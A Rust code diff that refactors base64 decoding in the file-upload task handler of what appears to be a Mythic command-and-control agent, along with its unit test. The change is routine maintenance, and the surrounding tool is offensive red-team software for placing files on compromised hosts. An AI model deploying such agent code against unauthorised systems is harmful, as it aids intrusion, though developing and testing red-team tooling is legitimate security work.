@@ -17,6 +17,8 @@ use std::path::Path;
 use mythic::{TaskMessage, TaskResponse};
 use serde::Deserialize;
 
+use crate::sys::encoding::decode_b64;
+
 // ── Params ──────────────────────────────────────────────────
 
 #[derive(Deserialize)]
@@ -39,10 +41,9 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
     };
 
     // 1. Decode base64
-    use base64::Engine;
-    let data = match base64::engine::general_purpose::STANDARD.decode(params.file_bytes.trim()) {
+    let data = match decode_b64(&params.file_bytes) {
         Ok(d) => d,
-        Err(e) => return TaskResponse::failed(task.id, &format!("base64 decode failed: {e}")),
+        Err(e) => return TaskResponse::failed(task.id, &e),
     };
 
     // 2. Create parent directories if needed
@@ -82,11 +83,10 @@ mod tests {
 
     #[test]
     fn test_upload_and_verify() {
-        use base64::Engine;
         use std::io::Read;
 
         let original = b"nanaz upload test payload\0with\0nulls";
-        let encoded = base64::engine::general_purpose::STANDARD.encode(original);
+        let encoded = crate::sys::encoding::encode_b64(original);
 
         let tmp_path = {
             let mut p = std::env::temp_dir();
